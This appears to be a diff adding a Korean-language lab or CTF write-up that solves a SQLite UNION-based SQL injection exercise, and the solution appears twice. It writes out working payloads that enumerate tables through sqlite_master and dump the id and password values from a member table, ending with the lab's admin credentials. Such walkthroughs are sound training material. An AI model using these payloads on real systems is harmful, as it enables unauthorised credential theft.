@@ -1,0 +1,61 @@
+union.zip
+
+1. 쿼리문의 형태는 select 컬럼들 from 이름 where like '%멍팔%' 형태로 유추 가능
+- 멍팔%' and 'w%'='w 로 입력 시 멍멍팔 정보 출력 확인
+
+2. 공격 포인트는 멍팔%' (공격구문) %'
+
+3. union제약사항을 확인하기 위해 멍팔%' order by 숫자-- 입력하여 컬럼의 개수 확인
+- 이미 나온 정보로 컬럼은 5개라는 걸 확인 할 수 있지만 확인은 해본 결과 총 컬럼 5개 확인
+- 자료형 예측은
+이름 : 문자
+점수 : 정수
+지역 : 문자
+취미 : 문자
+나이 : 정수
+멍팔%' union select 'a', 11, 'c', 'd', 15 and 'r%'='r -> 입력 시 새로운 정보 출력 되는 것 확인
+
+4. 테이블명과 컬럼명을 가져오기 위해 
+테이블명 -> 멍팔%' union select name, null, null, null, null from sqlite_master where type ='table' and 'w%'='w : member, profile, sqlite_sequence 테이블 확인
+컬럼명 -> 멍팔%' union SELECT sql, null, null, null, null FROM sqlite_master WHERE tbl_name='member' and 'w%'='w : member 테이블의 컬럼 확인
+-> 컬럼 확인 시 id, password 컬럼 확인됨.
+
+5. 데이터 확인
+멍팔%' union select id, password, null, null, null from member -- : 쿼리 입력 후 모든 계정의 id와 패스워드 확인됨
+
+6. 정답
+id : admin
+password : passw0rd
+
+=============================
+* SQLite3 union.zip 
+=============================
+풀이 과정
+1. 쿼리문의 형태는 select 컬럼들 from 이름 where like '%멍팔%' 형태로 유추 가능
+- 멍팔%' and 'w%'='w 로 입력 시 멍멍팔 정보 출력 확인
+
+2. 공격 포인트는 멍팔%' (공격구문) %'
+
+3. union제약사항을 확인하기 위해 멍팔%' order by 숫자-- 입력하여 컬럼의 개수 확인
+- 이미 나온 정보로 컬럼은 5개라는 걸 확인 할 수 있지만 확인은 해본 결과 총 컬럼 5개 확인
+- 자료형 예측은
+이름 : 문자
+점수 : 정수
+지역 : 문자
+취미 : 문자
+나이 : 정수
+멍팔%' union select 'a', 11, 'c', 'd', 15 and 'r%'='r -> 입력 시 새로운 정보 출력 되는 것 확인
+
+4. 테이블명과 컬럼명을 가져오기 위해 
+테이블명 -> 멍팔%' union select name, null, null, null, null from sqlite_master where type ='table' and 'w%'='w : member, profile, sqlite_sequence 테이블 확인
+컬럼명 -> 멍팔%' union SELECT sql, null, null, null, null FROM sqlite_master WHERE tbl_name='member' and 'w%'='w : member 테이블의 컬럼 확인
+-> 컬럼 확인 시 id, password 컬럼 확인됨.
+
+5. 데이터 확인
+멍팔%' union select id, password, null, null, null from member -- : 쿼리 입력 후 모든 계정의 id와 패스워드 확인됨
+
+2. 관리자의 ID, 비밀번호
+id : admin
+password : passw0rd
+=============================
+ 
